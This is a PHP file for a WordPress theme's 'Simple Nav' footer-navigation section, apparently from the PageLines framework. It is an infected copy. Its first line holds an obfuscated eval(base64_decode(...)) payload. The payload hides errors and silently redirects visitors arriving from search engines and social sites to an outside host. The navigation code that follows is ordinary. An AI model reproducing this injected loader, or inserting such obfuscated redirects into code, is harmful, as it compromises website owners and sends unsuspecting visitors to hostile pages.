<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/*
	Section: Simple Nav
	Author: PageLines
	Author URI: http://www.pagelines.com
	Description: Creates footer navigation.
	Class Name: SimpleNav
	Workswith: footer
*/

class SimpleNav extends PageLinesSection {

	function section_persistent(){
		register_nav_menus( array( 'simple_nav' => __( 'Simple Nav Section', 'pagelines' ) ) );
	
		add_filter('pagelines_css_group', array(&$this, 'section_selectors'), 10, 2);

	}

	function section_selectors($selectors, $group){

		$s['nav_standard'] = '.main-nav li:hover, .main-nav .current-page-ancestor a,  .main-nav li.current-page-ancestor ul a, .main-nav li.current_page_item a, .main-nav li.current-menu-item a, .sf-menu li li, .sf-menu li li li';

		$s['nav_standard_border'] = 'ul.sf-menu ul li';

		$s['nav_highlight'] = '.main-nav li a:hover, .main-nav .current-page-ancestor .current_page_item a, .main-nav li.current-page-ancestor ul a:hover';


		if($group == 'box_color_primary')
			$selectors .= ','.$s['nav_standard'];
		elseif($group == 'box_color_secondary')	
			$selectors .= ','.$s['nav_highlight'];
		elseif( $group == 'border_primary' )
			$selectors .= ','.$s['nav_standard_border'];

		return $selectors;
	}
	
	
   function section_template() { 

	if(function_exists('wp_nav_menu'))
		wp_nav_menu( array('menu_class'  => 'inline-list simplenav font-sub', 'theme_location'=>'simple_nav','depth' => 1,  'fallback_cb'=>'simple_nav_fallback') );
	else
		nav_fallback();
	}

}

if(!function_exists('simple_nav_fallback')){
	function simple_nav_fallback() {
		printf('<ul id="simple_nav_fallback" class="inline-list simplenav font-sub">%s</ul>', wp_list_pages( 'title_li=&sort_column=menu_order&depth=1&echo=0') );
	}
}
